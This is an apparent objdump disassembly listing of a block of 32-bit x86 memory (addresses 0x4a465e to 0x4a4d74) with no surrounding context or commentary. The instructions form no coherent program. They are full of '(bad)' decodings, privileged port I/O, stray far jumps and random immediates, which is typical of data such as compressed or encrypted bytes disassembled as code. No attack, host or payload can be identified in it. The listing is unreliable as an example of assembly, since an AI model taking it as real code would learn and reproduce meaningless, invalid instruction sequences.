  4a465e:	push   cs
  4a465f:	adc    BYTE PTR [edx+0x628520a],bh
  4a4665:	test   al,0xff
  4a4667:	pop    ds
  4a4668:	add    cl,ch
  4a466a:	or     al,bl
  4a466c:	xor    BYTE PTR ds:0xfebbe04,0xa
  4a4673:	mov    ebp,0x186efa41
  4a4678:	ja     0x57184e5f
  4a467e:	jbe    0x4a4614
  4a4680:	popa   
  4a4681:	sbb    dh,bh
  4a4683:	call   0xba395385
  4a4688:	sub    al,BYTE PTR [eax]
  4a468a:	dec    edi
  4a468b:	xchg   BYTE PTR [ecx],al
  4a468d:	sub    DWORD PTR [esi+eax*2+0x1f1869e0],ecx
  4a4694:	jb     0x4a46e5
  4a4696:	pop    ds
  4a4697:	ja     0x4a46cc
  4a4699:	push   edx
  4a469a:	add    edx,0xd5c06cd9
  4a46a0:	aam    0xc0
  4a46a2:	shr    DWORD PTR [edi+0x2b],0x6
  4a46a6:	add    bl,ch
  4a46a8:	and    BYTE PTR [esp+ebx*4],cl
  4a46ab:	popa   
  4a46ac:	inc    edi
  4a46ad:	jmp    0x4a4671
  4a46af:	inc    edx
  4a46b0:	fnsave [ebx-0x5f]
  4a46b3:	pop    ebp
  4a46b4:	fwait
  4a46b5:	pop    esp
  4a46b6:	add    ebx,DWORD PTR [edx+ebp*8-0x7ec70400]
  4a46bd:	push   cs
  4a46be:	imul   eax,DWORD PTR [edi+0x4],0x81395deb
  4a46c5:	pop    ss
  4a46c6:	stc    
  4a46c7:	jecxz  0x4a46fe
  4a46c9:	sub    DWORD PTR [ebx],esp
  4a46cb:	mov    eax,ds:0x57c85b42
  4a46d0:	add    eax,0xa024b2b1
  4a46d5:	or     esi,DWORD PTR [ecx-0x3cf9d697]
  4a46db:	sub    BYTE PTR [ebp+eax*2+0x7e081e1],dh
  4a46e2:	inc    edx
  4a46e3:	xchg   edx,eax
  4a46e4:	push   es
  4a46e5:	xchg   ebp,eax
  4a46e6:	nop
  4a46e7:	or     dh,BYTE PTR [ebx+0x9f90bc8]
  4a46ed:	gs push edi
  4a46ef:	add    ah,bh
  4a46f1:	retf   
  4a46f2:	push   ds
  4a46f3:	repnz inc edx
  4a46f5:	push   ds
  4a46f6:	inc    edi
  4a46f7:	add    eax,DWORD PTR [edi+0x3]
  4a46fa:	inc    edi
  4a46fb:	add    al,0xe1
  4a46fd:	pop    edx
  4a46fe:	push   0x4b
  4a4700:	cmp    edx,DWORD PTR [edi]
  4a4702:	add    eax,0x4f6a16b
  4a4707:	gs dec ebx
  4a4709:	pop    ss
  4a470a:	and    edx,DWORD PTR [eax-0x75]
  4a470d:	add    DWORD PTR [esi],0xd4d350cb
  4a4713:	inc    ebx
  4a4714:	les    eax,FWORD PTR [esi+eax*1]
  4a4717:	push   ecx
  4a4718:	xor    eax,0x129680f6
  4a471d:	(bad)  
  4a4721:	in     al,0x4a
  4a4723:	push   eax
  4a4724:	pusha  
  4a4725:	add    dl,ch
  4a4727:	repnz sbb cl,BYTE PTR [ecx+eax*8]
  4a472b:	je     0x4a4776
  4a472d:	mov    ds:0xc2c2de52,eax
  4a4732:	or     DWORD PTR [edx+0x6a942625],ecx
  4a4738:	and    eax,0x9c947159
  4a473d:	inc    ebx
  4a473e:	xor    edi,DWORD PTR [ebp-0x21255a68]
  4a4744:	add    al,0x36
  4a4746:	adc    bl,BYTE PTR [ebx-0x5a5224fb]
  4a474c:	in     al,0x88
  4a474e:	aad    0x94
  4a4750:	and    eax,0x8a400b36
  4a4755:	pop    ecx
  4a4756:	push   esi
  4a4757:	jg     0x4a4787
  4a4759:	loopne 0x4a4762
  4a475b:	clc    
  4a475c:	and    BYTE PTR [eax+0x48],cl
  4a475f:	xchg   BYTE PTR [ebx],cl
  4a4761:	add    al,0x74
  4a4763:	and    al,BYTE PTR [ebx]
  4a4765:	loop   0x4a4725
  4a4767:	jns    0x4a47e2
  4a4769:	xor    ecx,DWORD PTR [edi]
  4a476b:	(bad)  
  4a476c:	and    ebp,esi
  4a476e:	sub    BYTE PTR [ebx],0x70
  4a4771:	or     bh,BYTE PTR [esi+0x4033a42]
  4a4777:	push   cs
  4a4778:	adc    edx,edi
  4a477a:	test   ah,bh
  4a477c:	mov    ebp,0xbbef7d61
  4a4781:	jl     0x4a4796
  4a4783:	add    DWORD PTR [ebx+eiz*8+0x4a],esi
  4a4787:	mov    dh,0x61
  4a4789:	out    0xe4,eax
  4a478b:	add    al,0xb9
  4a478d:	add    DWORD PTR [esp+edx*8+0x4],edi
  4a4791:	popf   
  4a4792:	mov    DWORD PTR [ebp+0x6c],edi
  4a4795:	mov    al,0xbf
  4a4797:	adc    BYTE PTR [esp+eiz*4+0x7d],dh
  4a479b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a479c:	sbb    DWORD PTR [esi],edx
  4a479e:	ror    BYTE PTR [esi-0x6a83ef47],cl
  4a47a4:	push   ss
  4a47a5:	js     0x4a47dd
  4a47a7:	aad    0x4f
  4a47a9:	pop    edx
  4a47aa:	jg     0x4a47e8
  4a47ac:	mov    dl,BYTE PTR [edx]
  4a47ae:	mov    al,ds:0x9c761b00
  4a47b3:	outs   dx,DWORD PTR ds:[esi]
  4a47b4:	cmp    DWORD PTR [edx+0x9],0x7a
  4a47b8:	pop    edi
  4a47b9:	pop    edi
  4a47ba:	shl    BYTE PTR [esi-0x52],cl
  4a47bd:	xchg   BYTE PTR [eax],al
  4a47bf:	stc    
  4a47c0:	adc    bl,BYTE PTR [esi+0x59]
  4a47c3:	sub    cl,al
  4a47c5:	mov    al,0x6
  4a47c7:	icebp  
  4a47c8:	jmp    0xfb99dcfa
  4a47cd:	mov    ah,0x7f
  4a47cf:	pusha  
  4a47d0:	jg     0x4a47fb
  4a47d2:	je     0x4a47a4
  4a47d4:	adc    al,BYTE PTR [eax]
  4a47d6:	jl     0x4a47ff
  4a47d8:	push   cs
  4a47d9:	or     bh,BYTE PTR [esi+0x48]
  4a47dc:	and    edi,DWORD PTR [ecx-0x4a]
  4a47df:	shl    BYTE PTR [eax+0x2f],0x20
  4a47e3:	mov    eax,0x3ad1c133
  4a47e8:	daa    
  4a47e9:	mov    eax,ds:0x2903852d
  4a47ee:	out    dx,al
  4a47ef:	xchg   edx,eax
  4a47f0:	out    dx,eax
  4a47f1:	or     bh,BYTE PTR [si+0xd]
  4a47f5:	jle    0x4a4816
  4a47f7:	inc    ebp
  4a47f8:	adc    al,0x28
  4a47fa:	ror    DWORD PTR [edx-0x164b54f4],0xe4
  4a4801:	sub    ecx,esp
  4a4803:	cmp    eax,0xcbe6cb94
  4a4808:	xchg   ecx,eax
  4a4809:	or     ebp,DWORD PTR [eax+0x17]
  4a480c:	lods   al,BYTE PTR ds:[esi]
  4a480d:	add    edx,DWORD PTR [ebx+0x6491c80c]
  4a4813:	xor    al,0xfe
  4a4815:	mov    esi,0x25a7ebb3
  4a481a:	and    edx,DWORD PTR [edx]
  4a481c:	pop    ebp
  4a481d:	jmp    0x4a4824
  4a481f:	jmp    0x4a4831
  4a4821:	lods   eax,DWORD PTR ds:[esi]
  4a4822:	in     al,0x4e
  4a4824:	sbb    eax,0x7ceb77
  4a4829:	fs mov al,fs:0x80274f33
  4a4830:	pop    ds
  4a4831:	vpor   ymm6,ymm1,YMMWORD PTR [ecx]
  4a4835:	pop    ss
  4a4836:	neg    ebx
  4a4838:	lea    ecx,[ebx-0x1b]
  4a483b:	or     DWORD PTR gs:[edi],0xffffffc3
  4a483f:	les    eax,FWORD PTR [edx]
  4a4841:	iret   
  4a4842:	mov    DWORD PTR [eax+0x53cf7c8d],esp
  4a4848:	stc    
  4a4849:	inc    edi
  4a484a:	clc    
  4a484b:	jmp    0x84a:0xfffffd9a
  4a4852:	mov    dh,BYTE PTR [eax+0x1e71d2eb]
  4a4858:	xor    eax,DWORD PTR [ebx-0x75]
  4a485b:	jo     0x4a48a0
  4a485d:	and    ch,bl
  4a485f:	loop   0x4a4899
  4a4861:	jnp    0x4a4865
  4a4863:	mov    cl,0x8d
  4a4865:	push   ebx
  4a4866:	sbb    BYTE PTR [ecx+ecx*2],0x33
  4a486a:	add    DWORD PTR [ebx+0x44],eax
  4a486d:	or     BYTE PTR [eax+eiz*1],0xcd
  4a4871:	add    DWORD PTR [esp+ecx*1],esi
  4a4874:	xchg   edi,eax
  4a4875:	sbb    al,0x92
  4a4877:	int    0x10
  4a4879:	cld    
  4a487a:	cld    
  4a487b:	std    
  4a487c:	add    DWORD PTR [eax],edx
  4a487e:	push   esi
  4a487f:	push   edx
  4a4880:	inc    edx
  4a4881:	ss in  eax,dx
  4a4883:	add    DWORD PTR [ebx-0x371b670a],eax
  4a4889:	jg     0x4a48c5
  4a488b:	jg     0x4a48a8
  4a488d:	pop    ecx
  4a488e:	inc    edi
  4a488f:	sti    
  4a4890:	adc    eax,ebx
  4a4892:	pop    esi
  4a4893:	dec    ecx
  4a4894:	inc    ebx
  4a4895:	cmp    ebp,edx
  4a4897:	sub    edx,DWORD PTR [ebx+ebp*1+0x502692bf]
  4a489e:	jg     0x4a48c6
  4a48a0:	je     0x4a4874
  4a48a2:	jl     0x4a48c8
  4a48a4:	mov    ds:0x7e2b2ed0,eax
  4a48a9:	les    edi,FWORD PTR [ebp+0x5f2a3f59]
  4a48af:	adc    al,0xda
  4a48b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a48b2:	sub    edi,DWORD PTR ds:0xf8f88327
  4a48b8:	jge    0x4a484e
  4a48ba:	in     al,0x6b
  4a48bc:	sbb    eax,0xea3b1543
  4a48c1:	cmp    eax,0x1ec35431
  4a48c6:	cmp    ebx,esp
  4a48c8:	cmp    DWORD PTR [ebp+0x69b2fa1f],edx
  4a48ce:	dec    edi
  4a48cf:	ss inc ebx
  4a48d1:	adc    bh,dh
  4a48d3:	stc    
  4a48d4:	sti    
  4a48d5:	mov    ecx,0xf6a69734
  4a48da:	lock in eax,dx
  4a48dc:	out    0xeb,eax
  4a48de:	mov    bh,0x64
  4a48e0:	ret    
  4a48e1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a48e2:	fsubp  st(7),st
  4a48e4:	dec    esp
  4a48e5:	aad    0xfb
  4a48e7:	aad    0xbb
  4a48e9:	xor    al,0x6d
  4a48eb:	enter  0x52f9,0xf8
  4a48ef:	mov    ah,0xf9
  4a48f1:	adc    al,cl
  4a48f3:	mov    al,0xef
  4a48f5:	dec    ebx
  4a48f6:	stos   DWORD PTR es:[edi],eax
  4a48f7:	cmc    
  4a48f8:	jmp    0x4a48bc
  4a48fa:	mov    bh,0x9d
  4a48fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a48fd:	xchg   esp,eax
  4a48fe:	push   es
  4a48ff:	imul   edx,DWORD PTR [edi+0x5bb4ebef],0x7d6cee86
  4a4909:	je     0x4a48dd
  4a490b:	cs stc 
  4a490d:	dec    esi
  4a490e:	cmp    BYTE PTR [ecx+0x574aeced],0x1e
  4a4915:	jl     0x4a48a1
  4a4917:	or     al,0x4e
  4a4919:	sub    ch,ah
  4a491b:	jmp    0x4a4982
  4a491d:	cmp    eax,0xf9576917
  4a4922:	and    edi,esi
  4a4924:	shl    BYTE PTR [eax],1
  4a4926:	push   esp
  4a4927:	sub    al,0x43
  4a4929:	add    al,0x93
  4a492b:	push   eax
  4a492c:	test   esp,edx
  4a492e:	pop    esp
  4a492f:	jp     0x4a4942
  4a4931:	fsub   DWORD PTR [ebp+0x3c]
  4a4934:	dec    eax
  4a4935:	rcl    BYTE PTR [ebx+0x34],1
  4a4938:	or     DWORD PTR [eax+0xc],esp
  4a493b:	mov    ds:0x221852a2,al
  4a4940:	xchg   ecx,eax
  4a4941:	add    eax,0x88af121c
  4a4946:	lahf   
  4a4947:	ss push esi
  4a4949:	cmp    al,ch
  4a494b:	push   edi
  4a494c:	cli    
  4a494d:	jge    0x4a4957
  4a494f:	sub    edi,edx
  4a4951:	adc    eax,0xf5e6f9ec
  4a4956:	iret   
  4a4957:	mov    edi,edi
  4a4959:	mov    cl,0xf8
  4a495b:	mov    BYTE PTR [edi+0x3e69e706],dl
  4a4961:	iret   
  4a4962:	lock (bad) 
  4a4964:	das    
  4a4965:	stc    
  4a4966:	adc    eax,0x6cd3eae0
  4a496b:	lahf   
  4a496c:	push   esp
  4a496d:	or     dh,dh
  4a496f:	ss maskmovq mm5,(bad)
  4a4971:	imul   DWORD PTR [ebx*8-0x440d2b03]
  4a4978:	push   ebx
  4a4979:	mov    bl,0x5
  4a497b:	or     eax,DWORD PTR [ecx]
  4a497d:	push   es
  4a497e:	pop    es
  4a497f:	pop    es
  4a4980:	push   es
  4a4981:	push   es
  4a4982:	or     edi,DWORD PTR [ebp+ebp*2-0x79]
  4a4986:	mov    al,ds:0xfcfe82cc
  4a498b:	ds mov edi,0xf3fd2406
  4a4991:	cmp    al,0xcf
  4a4993:	ror    DWORD PTR ds:0x5b6a8495,cl
  4a4999:	leave  
  4a499a:	stos   DWORD PTR es:[edi],eax
  4a499b:	jge    0x4a496c
  4a499d:	cmp    esp,ebx
  4a499f:	ds aas 
  4a49a1:	cli    
  4a49a2:	xchg   edi,eax
  4a49a3:	or     BYTE PTR [ecx],cl
  4a49a5:	iret   
  4a49a6:	repz push esp
  4a49a8:	cli    
  4a49a9:	or     cl,BYTE PTR [edx]
  4a49ab:	dec    ecx
  4a49ac:	sti    
  4a49ad:	mov    dl,0x6
  4a49af:	nop
  4a49b0:	outs   dx,BYTE PTR ds:[esi]
  4a49b1:	xlat   BYTE PTR ds:[ebx]
  4a49b2:	or     eax,0xb53cf3ec
  4a49b7:	cld    
  4a49b8:	cmp    ah,0x77
  4a49bb:	or     BYTE PTR [ecx+0x45],dh
  4a49be:	arpl   ax,si
  4a49c0:	add    DWORD PTR [esi],eax
  4a49c2:	adc    dl,ch
  4a49c4:	and    DWORD PTR [ecx],0xffffffd4
  4a49c7:	es jecxz 0x4a49e2
  4a49ca:	add    ah,BYTE PTR [esi+ebp*1]
  4a49cd:	das    
  4a49ce:	test   DWORD PTR [edx+0x6c7beadc],ecx
  4a49d4:	sbb    bh,bh
  4a49d6:	inc    edx
  4a49d7:	ficom  DWORD PTR [edi+0x24]
  4a49da:	cmp    esi,edx
  4a49dc:	jae    0x4a4a1c
  4a49de:	mov    eax,ds:0xb6e21627
  4a49e3:	loopne 0x4a4a5d
  4a49e5:	add    DWORD PTR [ebx+0x6b44425e],esi
  4a49eb:	dec    eax
  4a49ec:	mov    ds:0x81fc6ecb,eax
  4a49f1:	xchg   ebx,eax
  4a49f2:	and    al,0x14
  4a49f4:	inc    esi
  4a49f5:	fbstp  TBYTE PTR [esp+ebx*2]
  4a49f8:	inc    eax
  4a49f9:	mov    edx,0xbce48690
  4a49fe:	adc    DWORD PTR [edx+0x24],ecx
  4a4a01:	out    dx,al
  4a4a02:	fisttp WORD PTR [ebp-0x53ee6ec]
  4a4a08:	or     BYTE PTR [eax+0x6e050e16],cl
  4a4a0e:	loop   0x4a49af
  4a4a10:	hlt    
  4a4a11:	mov    al,0x3b
  4a4a13:	ja     0x4a4a39
  4a4a15:	jb     0x4a4a3d
  4a4a17:	add    edx,DWORD PTR [edx]
  4a4a19:	xor    dl,cl
  4a4a1b:	sub    BYTE PTR [edx+edx*4+0x1dbdcc96],0x66
  4a4a23:	mulps  xmm2,XMMWORD PTR [eax+0x1]
  4a4a27:	pop    ebx
  4a4a28:	cmp    al,ah
  4a4a2a:	inc    ebp
  4a4a2b:	jmp    0xee4d4bbe
  4a4a30:	mov    esp,0x81740033
  4a4a35:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4a36:	add    eax,0xe43953
  4a4a3b:	mov    esi,0xd6d0034b
  4a4a40:	cmp    DWORD PTR ds:0xda0801e1,esp
  4a4a46:	sub    ebx,DWORD PTR [edx]
  4a4a48:	mov    ah,0xda
  4a4a4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4a4b:	sbb    DWORD PTR [ebx-0x50],0xffffffde
  4a4a4f:	push   ds
  4a4a50:	into   
  4a4a51:	pop    eax
  4a4a52:	jne    0x4a49ff
  4a4a54:	inc    ebx
  4a4a55:	or     eax,DWORD PTR [ecx+eiz*1-0x5525425f]
  4a4a5c:	mov    ds:0xb3f1be7d,al
  4a4a61:	dec    edx
  4a4a62:	imul   ebp,DWORD PTR [esi+0x6a107ce3],0x69734bed
  4a4a6c:	fidiv  DWORD PTR [esi-0x2f]
  4a4a6f:	push   edx
  4a4a70:	jne    0x4a4ad1
  4a4a72:	push   0x74ab787e
  4a4a77:	sbb    DWORD PTR [esi+edx*2],eax
  4a4a7a:	out    0x76,eax
  4a4a7c:	cli    
  4a4a7d:	add    edi,DWORD PTR [eax+0x14]
  4a4a80:	fwait
  4a4a81:	inc    edx
  4a4a82:	in     al,0x29
  4a4a84:	or     BYTE PTR [edi+0x57],0x51
  4a4a88:	jecxz  0x4a4aa0
  4a4a8a:	hlt    
  4a4a8b:	pop    ebx
  4a4a8c:	nop
  4a4a8d:	mov    ch,0x86
  4a4a8f:	mov    dl,0x41
  4a4a91:	xchg   dx,ax
  4a4a93:	mov    ch,bh
  4a4a95:	dec    edi
  4a4a96:	xchg   ebx,eax
  4a4a97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a4a98:	cmp    eax,0x47f8910b
  4a4a9d:	dec    edi
  4a4a9e:	dec    ebp
  4a4a9f:	dec    ebx
  4a4aa0:	mov    eax,ds:0x3f80f8e6
  4a4aa5:	iret   
  4a4aa6:	jno    0x4a4a80
  4a4aa8:	pop    esi
  4a4aa9:	add    BYTE PTR [ebx+0x53],cl
  4a4aac:	fldcw  WORD PTR [esi]
  4a4aae:	pop    edi
  4a4aaf:	adc    bh,dh
  4a4ab1:	add    BYTE PTR [ebp-0x12],bl
  4a4ab4:	pop    es
  4a4ab5:	ds adc al,0x89
  4a4ab8:	pusha  
  4a4ab9:	lahf   
  4a4aba:	lea    eax,[ebx+0x52]
  4a4abd:	jg     0x4a4a68
  4a4abf:	loopne 0x4a4b3c
  4a4ac1:	imul   ecx,DWORD PTR [edi],0xffffff87
  4a4ac4:	pop    edi
  4a4ac5:	xchg   ebp,eax
  4a4ac6:	nop
  4a4ac7:	fiadd  DWORD PTR [esi+esi*4-0x19]
  4a4acb:	add    DWORD PTR [ebp+ebp*1+0x26],eax
  4a4acf:	push   cs
  4a4ad0:	add    eax,0xf8c68bab
  4a4ad5:	inc    esi
  4a4ad6:	and    ebp,ebp
  4a4ad8:	add    al,dl
  4a4ada:	push   gs
  4a4adc:	sar    DWORD PTR [edx-0x6ea365ae],0xc0
  4a4ae3:	pusha  
  4a4ae4:	mov    eax,0xc7f8b91
  4a4ae9:	repz push ebx
  4a4aeb:	cmp    dl,BYTE PTR [edi]
  4a4aed:	and    eax,0xb6f1b594
  4a4af2:	adc    al,0xa
  4a4af4:	sub    BYTE PTR [esp+esi*8],bh
  4a4af7:	adc    BYTE PTR [eax+0xf],dl
  4a4afa:	jmp    0x2d8a:0x4f13e2db
  4a4b01:	add    ebp,ebx
  4a4b03:	out    0x25,eax
  4a4b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4b06:	nop
  4a4b07:	sbb    ah,BYTE PTR [eax]
  4a4b09:	jl     0x4a4b0b
  4a4b0b:	fadd   st(6),st
  4a4b0d:	ret    
  4a4b0e:	xchg   ebp,eax
  4a4b0f:	rcr    cl,cl
  4a4b11:	(bad)  
  4a4b14:	sub    dl,BYTE PTR [ebp-0x6a]
  4a4b17:	ror    BYTE PTR [eax+0x2c515bf1],cl
  4a4b1d:	popf   
  4a4b1e:	retf   0xbb65
  4a4b21:	add    esi,DWORD PTR [eax-0x45e8e425]
  4a4b27:	and    eax,0x2b676850
  4a4b2c:	fcomp  DWORD PTR [esi+0x9]
  4a4b2f:	mov    WORD PTR [ebx],es
  4a4b31:	repnz adc eax,0x2384b495
  4a4b37:	or     eax,0xa759600
  4a4b3c:	cdq    
  4a4b3d:	rcl    dh,0x60
  4a4b40:	pop    esi
  4a4b41:	pop    edx
  4a4b42:	add    al,0x74
  4a4b44:	jmp    0x4a4ba7
  4a4b46:	inc    esp
  4a4b47:	sbb    BYTE PTR [eax+0x1a],bl
  4a4b4a:	dec    esi
  4a4b4b:	push   ecx
  4a4b4c:	nop
  4a4b4d:	xchg   BYTE PTR [edi-0x2ef5f262],al
  4a4b53:	push   eax
  4a4b54:	pop    edx
  4a4b55:	sub    dh,BYTE PTR [esi-0x7a0fe82]
  4a4b5b:	rcl    BYTE PTR [edx+0x536aca1d],1
  4a4b61:	jmp    0x4a4b82
  4a4b63:	stos   DWORD PTR es:[edi],eax
  4a4b64:	test   eax,0x8b76e94c
  4a4b69:	fidiv  DWORD PTR [ecx+edx*2+0x49]
  4a4b6d:	jl     0x4a4bdb
  4a4b6f:	(bad)  
  4a4b70:	in     al,dx
  4a4b71:	inc    bx
  4a4b73:	mov    ch,0x22
  4a4b75:	cmp    eax,0xb53e2c71
  4a4b7a:	and    BYTE PTR [esi+0x15e7fdfd],0x41
  4a4b81:	mov    edx,0x6cc2024
  4a4b86:	cmc    
  4a4b87:	int    0xe7
  4a4b89:	jns    0x4a4b29
  4a4b8b:	mov    al,0xc7
  4a4b8d:	jl     0x4a4bf8
  4a4b8f:	fld    QWORD PTR [ecx]
  4a4b91:	push   ds
  4a4b92:	retf   0xf3b5
  4a4b95:	cmp    al,0x29
  4a4b97:	mov    edx,0x59d10a01
  4a4b9c:	ins    DWORD PTR es:[di],dx
  4a4b9e:	or     edx,DWORD PTR [eax+0x59]
  4a4ba1:	add    cl,BYTE PTR [ebx+0x5d]
  4a4ba4:	out    0xec,al
  4a4ba6:	push   es
  4a4ba7:	or     ah,BYTE PTR [ebx]
  4a4ba9:	cmp    ecx,DWORD PTR [edi+eiz*2]
  4a4bac:	imul   esp,DWORD PTR [esi+0xea888b6],0xa
  4a4bb3:	or     al,BYTE PTR [ecx]
  4a4bb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4bb6:	in     al,0x69
  4a4bb8:	jle    0x4a4bbf
  4a4bba:	add    eax,0xa070a06
  4a4bbf:	or     BYTE PTR [ebp+0x3fba0c1],ah
  4a4bc5:	or     edi,ebx
  4a4bc7:	cwde   
  4a4bc8:	push   es
  4a4bc9:	ds push eax
  4a4bcb:	cs pop ebp
  4a4bcd:	xchg   edi,eax
  4a4bce:	inc    ecx
  4a4bcf:	push   ecx
  4a4bd0:	ret    0xb1a6
  4a4bd3:	es xchg ecx,eax
  4a4bd5:	daa    
  4a4bd6:	cs inc esp
  4a4bd8:	hlt    
  4a4bd9:	xchg   BYTE PTR [ecx+0x1e],dh
  4a4bdc:	pop    ebp
  4a4bdd:	push   ebx
  4a4bde:	inc    ecx
  4a4bdf:	sub    al,0x41
  4a4be1:	or     al,dl
  4a4be3:	push   ds
  4a4be4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4be5:	xchg   ebp,eax
  4a4be6:	xchg   edx,eax
  4a4be7:	cs cld 
  4a4be9:	push   esi
  4a4bea:	or     DWORD PTR ds:0x17374d23,esi
  4a4bf0:	xor    BYTE PTR [ebp-0x4ff975ca],dl
  4a4bf6:	cmp    DWORD PTR ds:0xd2840aea,eax
  4a4bfc:	xchg   ebx,eax
  4a4bfd:	add    BYTE PTR [esp+eax*2],ch
  4a4c00:	or     edx,DWORD PTR [edx-0x79]
  4a4c03:	mov    ebp,0x66dec074
  4a4c08:	jo     0x4a4c69
  4a4c0a:	jle    0x4a4be0
  4a4c0c:	xchg   BYTE PTR [eax],ah
  4a4c0e:	xor    BYTE PTR [ebp+0x65],dl
  4a4c11:	mov    eax,ds:0xce229a
  4a4c16:	hlt    
  4a4c17:	je     0x4a4ba4
  4a4c19:	push   es
  4a4c1a:	hlt    
  4a4c1b:	or     al,0x6e
  4a4c1d:	dec    edi
  4a4c1e:	xor    eax,0xac80c65e
  4a4c23:	out    0xe2,eax
  4a4c25:	push   0xb0f48629
  4a4c2a:	jo     0x4a4c48
  4a4c2c:	dec    esp
  4a4c2d:	push   esp
  4a4c2e:	es call 0xb511:0x637c43
  4a4c36:	test   al,0x20
  4a4c38:	nop
  4a4c39:	mov    dl,0x32
  4a4c3b:	jbe    0x4a4c65
  4a4c3d:	push   esi
  4a4c3e:	xchg   ebx,eax
  4a4c3f:	or     DWORD PTR [edx+eiz*1],ebp
  4a4c42:	out    dx,eax
  4a4c43:	jb     0x4a4c32
  4a4c45:	xor    dh,BYTE PTR [edi+0x3]
  4a4c48:	das    
  4a4c49:	sti    
  4a4c4a:	or     ebx,DWORD PTR [esi+0x55]
  4a4c4d:	cdq    
  4a4c4e:	xchg   BYTE PTR [esi-0xeed3b96],bl
  4a4c54:	mov    dh,0x53
  4a4c56:	test   DWORD PTR [ecx],esi
  4a4c58:	dec    ebp
  4a4c59:	iret   
  4a4c5a:	dec    eax
  4a4c5b:	jmp    0xfc02:0xcd50a62b
  4a4c62:	add    eax,0x2094ec9
  4a4c67:	adc    eax,0x3a88114
  4a4c6c:	or     al,0xf2
  4a4c6e:	and    eax,0xbe7de426
  4a4c73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a4c74:	mov    cl,0x88
  4a4c76:	(bad)  
  4a4c77:	call   0x2b86caa7
  4a4c7c:	pop    esi
  4a4c7d:	inc    eax
  4a4c7e:	cmp    DWORD PTR [esi+0xc],0x6e0412d8
  4a4c85:	inc    edx
  4a4c86:	or     al,0x2d
  4a4c88:	xor    ecx,ecx
  4a4c8a:	or     BYTE PTR [edi-0x4cb98f7c],dl
  4a4c90:	push   cs
  4a4c91:	adc    al,0xd0
  4a4c93:	sub    BYTE PTR [eax+0x75],bl
  4a4c96:	fst    QWORD PTR [ebx-0x3c]
  4a4c99:	or     DWORD PTR [esi+0x6a7d2e50],edi
  4a4c9f:	dec    edi
  4a4ca0:	add    al,0x88
  4a4ca2:	ins    DWORD PTR es:[edi],dx
  4a4ca3:	dec    edi
  4a4ca4:	mov    dl,0xf1
  4a4ca6:	push   ds
  4a4ca7:	push   esp
  4a4ca8:	mov    esp,DWORD PTR [eax+0x163be4ff]
  4a4cae:	push   es
  4a4caf:	mov    al,0x1a
  4a4cb1:	sub    edx,eax
  4a4cb3:	adc    BYTE PTR [ebp+0x6d2135aa],ch
  4a4cb9:	mov    ebx,0x16a19000
  4a4cbe:	aam    0x6e
  4a4cc0:	and    BYTE PTR [ecx],ch
  4a4cc2:	dec    ebp
  4a4cc3:	in     al,dx
  4a4cc4:	js     0x4a4cb6
  4a4cc6:	jle    0x4a4d27
  4a4cc8:	sar    DWORD PTR [esi-0x4d],cl
  4a4ccb:	test   BYTE PTR [ebx],al
  4a4ccd:	ret    
  4a4cce:	push   edx
  4a4ccf:	add    ecx,edi
  4a4cd1:	push   eax
  4a4cd2:	mov    al,0xe4
  4a4cd4:	call   0x22d19e66
  4a4cd9:	and    cl,BYTE PTR ds:0xc8faf842
  4a4cdf:	adc    DWORD PTR [esp+ebx*8+0x33],eax
  4a4ce3:	and    BYTE PTR [ecx-0x1a],al
  4a4ce6:	sub    al,0x6
  4a4ce8:	dec    ecx
  4a4ce9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a4cea:	loopne 0x4a4c77
  4a4cec:	add    DWORD PTR [esi],esi
  4a4cee:	add    ebp,ecx
  4a4cf0:	xchg   ecx,eax
  4a4cf1:	or     BYTE PTR [ebx-0x42a8f24b],0xe2
  4a4cf8:	push   ebx
  4a4cf9:	mov    al,0x20
  4a4cfb:	pop    eax
  4a4cfc:	lds    ecx,FWORD PTR [edx]
  4a4cfe:	cmp    DWORD PTR [ecx+0x18],0xffffff89
  4a4d02:	shr    BYTE PTR [ecx+0x201ade28],1
  4a4d08:	mov    dh,0x71
  4a4d0a:	fnsave [esi]
  4a4d0c:	ud0    eax,DWORD PTR [eax]
  4a4d0f:	jp     0x4a4d2e
  4a4d11:	pop    ecx
  4a4d12:	inc    esp
  4a4d13:	jmp    0x5318957e
  4a4d18:	push   es
  4a4d19:	push   edi
  4a4d1a:	jno    0x4a4d28
  4a4d1c:	mov    ebp,DWORD PTR [eax]
  4a4d1e:	retf   
  4a4d1f:	jae    0x4a4d39
  4a4d21:	add    DWORD PTR [esi+0x562b9061],eax
  4a4d27:	jns    0x4a4d95
  4a4d29:	and    DWORD PTR [ebx+0x78cd3aa4],esp
  4a4d2f:	sbb    BYTE PTR [eax+0x5c],al
  4a4d32:	inc    esp
  4a4d33:	mov    ecx,DWORD PTR [edi+0x48]
  4a4d36:	xchg   al,bl
  4a4d38:	mov    ds:0x50248324,eax
  4a4d3d:	(bad)  
  4a4d3e:	jmp    0x4a4ccf
  4a4d40:	and    al,0xa0
  4a4d42:	pusha  
  4a4d43:	fmul   QWORD PTR [edi+esi*2]
  4a4d46:	retf   
  4a4d47:	cmp    al,0x97
  4a4d49:	jbe    0x4a4ceb
  4a4d4b:	add    ch,bh
  4a4d4d:	adc    al,cl
  4a4d4f:	adc    BYTE PTR [edi-0x461abb57],dh
  4a4d55:	adc    al,0xad
  4a4d57:	sti    
  4a4d58:	outs   dx,BYTE PTR ds:[esi]
  4a4d59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a4d5a:	sti    
  4a4d5b:	rcr    DWORD PTR [eax-0x80],0xed
  4a4d5f:	sbb    BYTE PTR [ecx],bh
  4a4d61:	add    eax,0x4417ccb4
  4a4d66:	xor    eax,DWORD PTR [eax+0x7a0b0240]
  4a4d6c:	sbb    edi,edx
  4a4d6e:	ret    
  4a4d6f:	adc    eax,0x8b82c7a4
  4a4d74:	xor    BYTE PTR [eax+0x2116f606],bh
